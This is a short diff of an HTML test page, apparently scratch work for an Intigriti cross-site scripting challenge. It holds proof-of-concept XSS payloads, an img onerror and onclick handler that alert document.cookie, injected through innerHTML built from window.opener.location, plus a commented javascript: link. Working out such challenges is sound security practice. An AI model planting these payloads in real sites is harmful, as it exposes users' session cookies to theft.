@@ -14,7 +14,7 @@
   </script>
   document.body.innerHTML = "<a href='" + window.location + "/nextPage'>unsafe!</a>"
   <script>
-    document.body.innerHTML = "<a href='" + window.opener.location + "/#<img src=x onerror=alert(document.cookie)>' onclick='alert(document.cookie)'>unsafe!1</a>"
+    document.body.innerHTML = "<a href='\" + window.opener.location + \"/#<img src=x onerror=alert(document.cookie)>' onclick='alert(document.cookie)'>unsafe!1</a>"
   </script>
 <!--   <a href="https://challenge.intigriti.io/" target="javascript:alert(document.cookie)">PoC1</a> -->
 
